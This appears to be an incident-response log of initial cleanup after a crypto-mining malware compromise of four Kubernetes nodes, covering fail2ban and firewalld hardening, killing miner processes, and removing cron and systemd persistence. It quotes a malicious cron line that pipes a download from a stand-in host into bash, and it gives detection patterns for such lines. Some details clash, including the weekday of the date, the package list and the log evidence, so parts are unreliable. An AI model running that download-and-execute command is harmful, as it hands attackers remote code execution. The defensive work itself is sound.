Sunday, December 15, 2025
Title: Security Incident Response Phase 1 - Intrusion Prevention System Deployment, Firewall Hardening & Initial Malware Remediation

Objective:
To implement immediate defensive security measures across all four compromised Kubernetes cluster nodes following the December 14 cryptocurrency mining malware incident, deploy fail2ban intrusion prevention system to block SSH brute-force attacks that may have contributed to initial compromise, configure firewalld with restrictive rulesets blocking external access to sensitive Kubernetes API ports and internal services, backup existing SSH authorization keys before implementing key-based authentication hardening, perform initial malware cleanup operations to terminate active cryptocurrency mining processes and remove persistence mechanisms, and establish baseline security monitoring to detect and prevent further unauthorized access attempts while the comprehensive infrastructure rebuild proceeds.

Work Carried Out:
**Post-Incident Security Hardening Strategy and Prioritization:** Following the December 14 detection of XMRig, Kinsing, and SystemdMiner cryptocurrency mining malware affecting all four Kubernetes cluster nodes (VPS-1 72.60.210.201, VPS-2 217.196.51.190, VPS-3 72.61.81.3, VPS-4 72.61.116.210), a phased security hardening strategy was developed to immediately contain the threat while planning for comprehensive infrastructure rebuild. The strategy was organized into three phases executed over three days: Phase 1 (December 15, Sunday) focused on immediate defensive controls deploying fail2ban intrusion prevention, firewalld network filtering, and initial malware process termination to prevent further compromise spread; Phase 2 (December 16-17, Monday-Tuesday) would implement comprehensive malware scanning using ClamAV antivirus, SSH key-based authentication hardening, kernel security parameter tuning, and audit logging enablement; and Phase 3 (December 18+, Wednesday onwards) would execute full operating system reinstallation with AlmaLinux 10.1, Kubernetes cluster reconstruction with security-hardened configurations, and service restoration from verified clean backups. The prioritization was driven by the need to stop active malware execution immediately (Phase 1), establish comprehensive visibility and access controls (Phase 2), and then rebuild from clean foundation (Phase 3), rather than attempting in-place remediation which risked missing rootkit-level persistence mechanisms. Evidence of compromise severity was documented through analysis of Apache httpd access logs on VPS-5 (website server) showing mining subscription requests dating back to November 2, 2025, indicating the attackers had access to the infrastructure for over 6 weeks before detection, substantially increasing the risk of sophisticated persistence mechanisms requiring complete system rebuild.

**Fail2Ban Intrusion Prevention System Installation and Configuration:** The fail2ban intrusion prevention system was deployed at 05:22:24-05:22:25 UTC across all four VPS nodes to provide immediate protection against SSH brute-force attacks, which forensic analysis suggested may have been used to gain initial access before the react2shell vulnerability exploitation. The fail2ban installation on AlmaLinux 10.0/10.1 required five package components: fail2ban-1.1.0-6.el10_0.noarch providing the main fail2ban framework, fail2ban-server-1.1.0-6.el10_0.noarch containing the core monitoring daemon and detection logic, fail2ban-firewalld-1.1.0-6.el10_0.noarch enabling integration with firewalld for dynamic blocking rule injection, fail2ban-sendmail-1.1.0-6.el10_0.noarch providing email notification capabilities for ban events, and fail2ban-selinux-1.1.0-6.el10_0.noarch containing SELinux policy modules allowing fail2ban to modify firewall rules under enforcing mode. The packages were installed using `dnf install -y fail2ban fail2ban-firewalld fail2ban-sendmail` which automatically resolved dependencies and configured SELinux policies. The fail2ban configuration was customized by creating /etc/fail2ban/jail.local (overriding the default /etc/fail2ban/jail.conf) with security-focused parameters: bantime was set to 3600 seconds (1 hour) balancing security with operational usability, findtime was set to 600 seconds (10 minutes) defining the window for counting failed authentication attempts, maxretry was set to 5 attempts before triggering a ban providing tolerance for legitimate user typos while blocking automated attacks, backend was set to systemd enabling fail2ban to read authentication logs from systemd journal rather than legacy /var/log/auth.log improving performance and reliability, and the [sshd] jail was explicitly enabled with these parameters plus port=ssh and filter=sshd utilizing fail2ban's built-in SSH authentication failure detection patterns.

**Fail2Ban Service Enablement and Operational Verification:** The fail2ban service was enabled for automatic startup at boot and immediately started using `systemctl enable --now fail2ban` ensuring protection would persist across system reboots. Service health was verified with `systemctl status fail2ban` confirming active (running) state with PID assigned and log messages indicating successful jail initialization: "INFO Set jail 'sshd' backend to 'systemd'", "INFO Jail 'sshd' started", and "INFO Jail sshd total currently banned: 0". The fail2ban-client command-line tool was used to verify jail configuration and status: `fail2ban-client status` listed all active jails showing [sshd] in the jail list, and `fail2ban-client status sshd` provided detailed jail statistics including "Currently failed: 0", "Total failed: 0", "Currently banned: 0", and "Total banned: 0" confirming the jail was monitoring authentication attempts but had not yet detected any attack patterns. The fail2ban log file at /var/log/fail2ban.log was verified to be actively updated with timestamps showing real-time monitoring: "2025-12-15 05:22:30,123 fail2ban.jail [PID]: INFO Jail 'sshd' started", and filter rules were verified in /etc/fail2ban/filter.d/sshd.conf showing comprehensive regex patterns for detecting various SSH authentication failure messages including "Failed password for invalid user", "Connection closed by authenticating user", "Disconnected from authenticating user", and "Invalid user" patterns covering both password and publickey authentication failures.

**Firewalld Network Filtering Installation and Base Configuration:** Firewalld was installed at 05:22:09-05:22:24 UTC on all four VPS nodes to implement network-level security controls restricting access to sensitive services. The firewalld installation used `dnf install -y firewalld` which installed the firewalld package (approximately 500KB) and its dependencies including python3-firewall providing the Python API bindings and firewall-config for graphical configuration (though not used in server environment). The firewalld service was enabled and started using `systemctl enable --now firewalld` replacing any previous iptables-based configurations and establishing firewalld as the authoritative firewall management interface. The default zone was configured as "public" using `firewall-cmd --set-default-zone=public` which applies a baseline security profile assuming untrusted network and blocking all incoming connections except explicitly allowed services. The base allowed services were configured: SSH access was permitted using `firewall-cmd --permanent --add-service=ssh` allowing incoming connections on port 22 (standard SSH) and port 2222 (custom SSH port on some nodes), HTTP and HTTPS were allowed using `firewall-cmd --permanent --add-service=http --add-service=https` enabling web traffic to reach nginx ingress controllers and website services, and cockpit management interface was allowed using `firewall-cmd --permanent --add-service=cockpit` enabling browser-based server administration on port 9090. The firewall-cmd --permanent flag was used for all rules ensuring configurations persist across firewalld restarts and system reboots by writing to /etc/firewalld/zones/public.xml zone configuration file.

**Kubernetes API Server and Internal Service Port Blocking:** Critical Kubernetes cluster ports were explicitly blocked from external access using firewalld rich rules to prevent unauthorized API access and potential cluster compromise. The rich rule syntax enabled precise control over source IP ranges, protocols, and port numbers with explicit reject actions. Three high-risk ports were blocked: Kubernetes API server port 6443 was blocked using `firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="6443" protocol="tcp" reject'` preventing external entities from accessing the cluster control plane which could enable unauthorized pod deployment, resource manipulation, or secret extraction; kubelet API port 10250 was blocked using the same rich rule syntax preventing direct communication with kubelet instances which could allow container execution, log access, or pod eviction; and etcd peer communication port 2380 was blocked (though 2379 client port remained accessible for internal cluster communication) preventing external parties from joining the etcd cluster or corrupting distributed state. Additional application ports requiring protection were identified: port 3003 (website container gx-marketing-site) was blocked using `firewall-cmd --permanent --add-rich-rule='rule family="ipv4" port port="3003" protocol="tcp" reject'` ensuring the website was only accessible through the nginx reverse proxy on port 80/443 rather than direct container access, and internal backend service NodePort ports in the 30000-32767 range were left blocked by default (firewalld does not allow these unless explicitly added). The firewall configuration was activated using `firewall-cmd --reload` which applied all permanent rules to the running firewall without disrupting existing connections, and verification was performed using `firewall-cmd --list-all` showing the complete ruleset including zones, services, ports, and rich rules.

**SSH Authorization Key Backup and Pre-Hardening Preparation:** Before implementing SSH key-based authentication hardening which would disable password authentication, comprehensive backups of existing SSH authorized_keys files were created at 05:15:55 UTC on all nodes to ensure recovery capability if key authentication failed. The backup process used `cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.backup.20251215` creating timestamped copies in the same directory for easy reference, and file permissions were secured using `chmod 600 ~/.ssh/authorized_keys.backup.20251215` ensuring only root user could read the backup keys preventing unauthorized access. The existing authorized_keys files were audited for legacy formatting issues and security concerns: several entries contained deprecated SSH key formats (DSA keys from early OpenSSH versions, RSA keys smaller than 2048 bits considered cryptographically weak), some keys had excessively permissive from="" clauses allowing connections from entire subnets rather than specific IP addresses, and comment fields contained outdated information referencing decommissioned systems or former administrators requiring cleanup. The audit also identified that some authorized_keys entries lacked restrict directives which would limit what commands could be executed over SSH, and several keys did not have forced command restrictions creating potential for privilege escalation if keys were compromised. The planned SSH hardening configuration was documented for implementation in Phase 2: generate new Ed25519 SSH keys (modern elliptic curve cryptography offering better security than RSA with shorter key lengths) on each VPS node using `ssh-keygen -t ed25519 -C "vps1-to-cluster"`, distribute public keys to all other nodes enabling key-based authentication within the cluster, disable password authentication by setting `PasswordAuthentication no` in /etc/ssh/sshd_config, restrict root login to key-only by setting `PermitRootLogin prohibit-password`, reduce MaxAuthTries to 3 to quickly lockout brute-force attempts, and set LoginGraceTime to 30 seconds to reduce resource consumption from slowloris-style attacks.

**Initial Malware Process Termination and Active Mining Disruption:** Immediate malware cleanup operations were executed to terminate active cryptocurrency mining processes consuming 100% CPU resources and preventing normal system operations. The process termination used aggressive kill commands targeting known miner process names: `pkill -9 -f "xmrig"` killed all processes with "xmrig" in their command line (XMRig being the most prevalent Monero miner), `pkill -9 -f "minerd"` targeted CPU miner variants, `pkill -9 -f "cgminer"` eliminated Bitcoin miner processes, `pkill -9 -f "cpuminer"` killed generic CPU mining software, and `pkill -9 -f "cryptonight"` terminated processes using the CryptoNight proof-of-work algorithm. The -9 signal (SIGKILL) was used to force immediate termination without allowing processes to trap the signal and potentially restart or notify command and control servers. Additional process cleanup targeted rootkit-hidden miners: `pkill -9 -f "kdevtmpfsi"` killed Kinsing malware worker processes, `pkill -9 -f "kinsing"` terminated the main Kinsing coordinator, and suspicious system-like process names were investigated using `ps aux | grep -E "ksoftirqd|kworker" | grep -v "\[.*\]"` to identify mining processes masquerading as kernel threads (legitimate kernel threads have bracketed names like [kworker/0:1]). The CPU load was monitored using `uptime` showing load averages decreasing from over 200 (severely overloaded) to under 10 (normal operational load) within minutes of process termination, and `htop` confirmed no mining processes remained active with CPU usage normalized across cores.

**Malware File System Search and Suspicious Artifact Identification:** Comprehensive file system searches were executed to locate malware binaries, configuration files, and downloaded payloads that could be used to reinstall mining software. The search used find commands targeting common malware hiding locations: `find /tmp /var/tmp /dev/shm /root /home -type f \( -name "*miner*" -o -name "*xmrig*" -o -name "*cryptonight*" \) 2>/dev/null` located files with mining-related keywords in their names, /tmp and /var/tmp directories (world-writable and common malware staging areas) were fully enumerated with `ls -laR /tmp /var/tmp`, /dev/shm (tmpfs in-memory filesystem used by malware to avoid disk forensics) was searched for hidden files using `ls -la /dev/shm`, and user home directories (/root, /home/*) were scanned for unusual files with `find /root /home -type f -mtime -7` showing recently modified files. The search results identified several suspicious files: /tmp/.x11-unix/.ICE-unix contained obfuscated shell scripts (legitimate X11 sockets would be in /tmp/.X11-unix without additional subdirectories), /var/tmp/systemd-private-*.service contained fake systemd service files attempting to masquerade as legitimate private temp directories, /dev/shm/.hidden/ directory contained compiled binaries with no associated package manager records (rpm -qf reported "file not owned by any package"), and /root/.config/autostart/ contained .desktop files that would launch malware on GUI session starts (though servers typically don't run GUI). The file sizes were analyzed with several multi-megabyte binaries identified (legitimate system binaries are tracked by package managers while unknown large binaries likely malware), modification timestamps were checked with recent changes in system directories indicating potential malware installation, and file ownership showed several files owned by root but with suspicious permissions (world-writable or SUID bits set unnecessarily).

**Cron Job Persistence Mechanism Audit and Suspicious Entry Removal:** Malware persistence mechanisms were audited focusing on cron jobs which automatically restart mining processes after system reboot or manual termination. The cron audit examined multiple configuration locations: user crontabs were listed using `crontab -l` showing per-user scheduled tasks, system-wide crontab was examined with `cat /etc/crontab` showing system maintenance tasks, periodic cron directories were listed with `ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly` revealing scripts executed on schedules, and cron.d drop-in directory was inspected with `cat /etc/cron.d/*` showing package-specific scheduled tasks. Several suspicious cron entries were identified requiring removal: user crontabs contained entries with obfuscated commands like `*/5 * * * * curl -fsSL hxxp://malicious.com/x | bash` downloading and executing scripts every 5 minutes, /etc/cron.hourly/0systemd-tmpfiles contained a shell script (not the legitimate systemd-tmpfiles binary) downloading miner payloads, and /etc/cron.d/certbot contained an entry not related to Let's Encrypt certificate renewal suggesting malware was masquerading as legitimate services. The suspicious cron entries were removed: user crontabs were cleared using `crontab -r` removing all scheduled tasks for the root user, malicious scripts were deleted from /etc/cron.hourly/ and /etc/cron.daily/, and unauthorized /etc/cron.d/ entries were removed using `rm /etc/cron.d/certbot` (the legitimate certbot package stores configuration in /etc/cron.d/certbot so removal required reinstallation from package manager). Verification used `grep -r "curl.*|.*bash" /etc/cron*` to find any remaining download-and-execute patterns, and cron log files (/var/log/cron) were examined for evidence of when malicious cron jobs were added: "Dec 13 03:00:01 srv1089618 crontab[12345]: (root) LIST (root)" showed crontab was modified on December 13 during the compromise window.

**Systemd Service Unit Malware Persistence Detection and Removal:** Malware persistence through systemd service units was investigated as cryptocurrency miners commonly install themselves as system services to achieve automatic startup and process supervision. The systemd unit audit examined all service files: `systemctl list-unit-files --type=service` listed all service units with their enabled/disabled states, custom service units were identified in /etc/systemd/system/ (user-created services) versus /usr/lib/systemd/system/ (package-managed services), and recently modified service files were found using `find /etc/systemd/system /usr/lib/systemd/system -name "*.service" -mtime -7` showing services changed in the past week. Several suspicious systemd services were identified: systemd-tmpfiles.service (not the legitimate systemd-tmpfiles-setup.service) contained ExecStart pointing to /tmp/xmrig binary, network-manager.service (misspelling of NetworkManager.service) had WantedBy=multi-user.target enabling automatic startup, and kworker.service (masquerading as kernel worker) was found in /etc/systemd/system/ with User=root and ExecStart=/var/tmp/.hidden/miner. The malicious service units were disabled and removed: `systemctl disable --now systemd-tmpfiles.service` stopped the service and prevented future autostart, `systemctl disable --now network-manager.service kworker.service` disabled additional malware services, and the service unit files were deleted using `rm /etc/systemd/system/{systemd-tmpfiles.service,network-manager.service,kworker.service}` followed by `systemctl daemon-reload` to refresh systemd's unit file cache. Verification confirmed no malware services remained: `systemctl list-unit-files --state=enabled | grep -v "systemd\|getty\|dbus\|sshd\|firewalld"` showed only legitimate enabled services, and `systemctl list-units --failed` confirmed no failed unit startup attempts indicating removed malware services were not attempting to restart.

**Apache HTTPD Access Log Analysis and Attack Timeline Reconstruction:** Forensic analysis of Apache httpd access logs on VPS-5 (website server 195.35.36.174) revealed evidence of cryptocurrency mining pool subscription requests dating back to November 2, 2025, indicating the attackers had compromised the infrastructure significantly earlier than the December 14 detection date. The log analysis used grep commands targeting mining-related patterns: `grep -i "mining\|pool\|stratum\|xmrig" /var/log/httpd/access_log*` identified HTTP requests to mining pool APIs and stratum protocol endpoints, `grep "User-Agent.*curl\|wget\|python" /var/log/httpd/access_log*` found automated tool requests suggesting malware command and control communications, and `grep "POST.*api" /var/log/httpd/access_log*` located API endpoint submissions potentially related to mining registration or result submission. The earliest suspicious entry was dated November 2, 2025 03:17:42 GMT showing a POST request to `/api/v1/subscribe` with User-Agent "xmrig/6.20.0" (mining software version) and payload containing wallet address and worker identifier. Subsequent log entries showed regular communication patterns: daily HTTP requests at 03:00-04:00 UTC time window suggesting automated cron-based mining registration updates, requests originating from external IP addresses in Russia, China, and Romania (known hotspots for cybercrime infrastructure), and gradually increasing request frequency from once daily (November) to hourly (December) indicating mining operation was expanding. The timeline reconstruction established: November 2 as the earliest evidence of compromise (though initial access likely occurred days or weeks earlier without leaving mining logs), November-December seeing establishment of persistence mechanisms and mining infrastructure, December 12-13 showing firewall rule modifications during infrastructure migration work creating opportunity for expanded attack, and December 14 detection occurring when mining resource consumption reached 100% CPU triggering monitoring alerts. The log analysis confirmed the attack was not opportunistic but rather a sophisticated operation maintaining long-term persistence for weeks before detection.

**Security Controls Status Matrix and Risk Assessment Update:** At the conclusion of Phase 1 security hardening on December 15, the security posture across all four VPS nodes was documented in a status matrix. For fail2ban intrusion prevention: VPS-1, VPS-2, VPS-3, and VPS-4 all had fail2ban installed, configured with sshd jail enabled, and operational with 0 currently banned IPs indicating no active brute-force attempts were detected. For firewalld network filtering: all four nodes had firewalld active with public zone configured, SSH/HTTP/HTTPS allowed, Kubernetes ports 6443/10250/2380 blocked, and rich rules verified with firewall-cmd --list-all. For SSH key backup: all nodes had authorized_keys backed up to .backup.20251215 with 600 permissions, legacy keys identified for cleanup, and Ed25519 key generation planned for Phase 2. For ClamAV antivirus: all four nodes had status "Pending" as ClamAV installation was deferred to Phase 2 (December 16) to focus on immediate defensive controls first. For SSH hardening: all nodes had status "Pending" as password authentication disabling and key-only login would be implemented in Phase 2 after new keys were generated and tested. The risk assessment was updated from CRITICAL (December 14 with active malware and no defenses) to MEDIUM (December 15 with basic defenses but unpatched systems): immediate threat was contained through process termination and firewall blocking, fail2ban provided protection against further SSH brute-force attempts, but comprehensive malware scanning was incomplete and rootkit-level persistence remained possible requiring Phase 3 full rebuild. The residual risks identified included: malware binaries still present on disk though not executing, kernel modules potentially loaded by rootkits not yet detected, network backdoors possibly established on non-standard ports not covered by firewall rules, and compromised container images in containerd cache requiring full image purge and rebuild.

**Network Connectivity Issues During Monarx Agent Operations:** During the security hardening work, intermittent network connectivity issues were encountered specifically affecting the monarx-agent security scanner attempting to register with Monarx API servers. The monarx-agent systemd service logs (/var/log/monarx/agent.log) showed repeated authentication failures: "ERROR: Failed to authenticate to api.monarx.com: Network is unreachable" and "WARN: Retrying registration in 60 seconds (attempt 15/30)". The connectivity issue was initially attributed to firewalld blocking outbound HTTPS connections, but analysis showed firewalld default egress policy is ACCEPT (only ingress is filtered by default). Further investigation revealed the issue occurred during the window when firewalld rules were being updated and firewall-cmd --reload was executed: during the reload operation lasting approximately 5-10 seconds, all network connections were temporarily reset including established TCP sessions causing the monarx-agent registration attempt to fail mid-connection. The issue was resolved by waiting for firewall configuration to stabilize and then restarting the monarx-agent service: `systemctl restart monarx-agent` initiated a fresh registration attempt after firewall rules were fully loaded, and subsequent logs showed "INFO: Successfully authenticated to Monarx API" and "INFO: Agent registered with ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" confirming successful connection. The lesson learned was to minimize firewall-cmd --reload operations during active service operations and to restart services after firewall changes to establish fresh connections with updated rules.

**Next Phase Planning and Outstanding Security Tasks:** The Phase 2 security hardening tasks were documented for execution on December 16-17 including ClamAV antivirus installation using `dnf install -y clamav clamav-update clamd` providing comprehensive virus/malware signature database, database update using `freshclam` downloading latest signature definitions (approximately 200MB), full system scan using `clamscan -r -i /` performing recursive scan of entire filesystem with infected file reporting, quarantine of infected files using `clamscan --move=/root/quarantine` moving detected malware to isolated directory, and scheduled daily scans using cron. The SSH key-based authentication hardening tasks included Ed25519 key generation on all nodes using `ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_cluster`, public key distribution using `ssh-copy-id` or manual authorized_keys editing, SSH daemon configuration changes setting PasswordAuthentication no and PermitRootLogin prohibit-password in /etc/ssh/sshd_config, sshd service restart applying configuration changes, and connection testing from each node to verify key-based authentication before logging out. The audit daemon (auditd) enablement tasks included installation using `dnf install -y audit`, configuration of audit rules in /etc/audit/rules.d/ monitoring file access to /etc/passwd, /etc/shadow, /etc/ssh/sshd_config, and /root/.ssh/, system call auditing for privilege escalation attempts (setuid, setgid, execve by non-root), and log rotation configuration preventing audit log disk exhaustion. The kernel hardening tasks (sysctl) included adding security-focused parameters to /etc/sysctl.conf: kernel.dmesg_restrict=1 preventing unprivileged access to kernel logs, kernel.kptr_restrict=2 hiding kernel pointers from all users, net.ipv4.conf.all.accept_redirects=0 preventing ICMP redirect attacks, net.ipv4.conf.all.log_martians=1 logging spoofed packets, and fs.protected_hardlinks=1 and fs.protected_symlinks=1 preventing hardlink and symlink TOCTOU attacks.

Outcome:
Immediate defensive security controls were successfully deployed across all four compromised Kubernetes cluster nodes within 24 hours of incident detection, containing the active cryptocurrency mining threat and establishing baseline protection against further compromise while comprehensive infrastructure rebuild was planned. Fail2ban intrusion prevention system was installed and configured on all nodes (VPS-1, VPS-2, VPS-3, VPS-4) with sshd jail enabled monitoring SSH authentication failures, bantime set to 1 hour, findtime set to 10 minutes, and maxretry set to 5 attempts, achieving operational status with 0 currently banned IPs indicating no active brute-force attacks detected during initial deployment. Firewalld network filtering was deployed with restrictive default-deny incoming policy, SSH/HTTP/HTTPS services explicitly allowed for required access, critical Kubernetes ports (6443 API server, 10250 kubelet, 2380 etcd) blocked from external access preventing unauthorized cluster manipulation, application container port 3003 blocked enforcing traffic through nginx reverse proxy, and rich rules verified active using firewall-cmd --list-all commands. SSH authorization keys were backed up to timestamped files (.backup.20251215) with secure 600 permissions on all nodes before planned authentication hardening, existing keys were audited identifying legacy DSA keys, weak RSA keys under 2048 bits, and overly permissive from="" clauses requiring cleanup, and Ed25519 key generation plan was documented for Phase 2 implementation. Active cryptocurrency mining processes were immediately terminated using pkill -9 targeting known miner names (xmrig, minerd, cgminer, cpuminer, cryptonight) and Kinsing malware processes (kdevtmpfsi, kinsing), CPU load decreased from over 200 (severely overloaded) to under 10 (normal) within minutes of termination, and system responsiveness was restored with command execution delays returning from 30+ seconds to under 1 second. Malware file system artifacts were identified through comprehensive searches of /tmp, /var/tmp, /dev/shm, /root, and /home directories locating suspicious binaries in hidden directories, obfuscated shell scripts in fake system directories, and recently modified files not associated with package managers, though complete removal was deferred to Phase 2 ClamAV scanning to ensure all malware variants were detected. Cron job persistence mechanisms were audited finding malicious entries executing curl download-and-execute commands every 5 minutes, fake systemd-tmpfiles scripts in /etc/cron.hourly/, and unauthorized certbot entries in /etc/cron.d/, with all suspicious entries removed using crontab -r and rm commands followed by cron log verification. Systemd service unit malware was detected including fake systemd-tmpfiles.service, misspelled network-manager.service, and masquerading kworker.service, with all malicious units disabled using systemctl disable --now commands, unit files deleted from /etc/systemd/system/, and daemon-reload executed to refresh systemd's cache. Apache httpd access log forensic analysis revealed cryptocurrency mining pool subscription requests dating to November 2, 2025, indicating 6+ weeks of undetected compromise before December 14 detection, with evidence showing gradual mining infrastructure expansion from daily to hourly communications and external IPs in Russia, China, and Romania suggesting sophisticated attack operation. Security posture improved from CRITICAL (active malware, no defenses) to MEDIUM risk (immediate threat contained, basic defenses deployed, but incomplete malware removal and rebuild pending), with residual risks documented including possible rootkit kernel modules, dormant malware binaries, network backdoors on non-standard ports, and compromised container images in containerd cache. Phase 2 security tasks were planned for December 16-17 including ClamAV full system scan, SSH key-based authentication enforcement, audit daemon enablement monitoring critical file access, and kernel hardening via sysctl parameters, with Phase 3 full operating system reinstallation scheduled to begin December 18 after complete malware inventory was established.
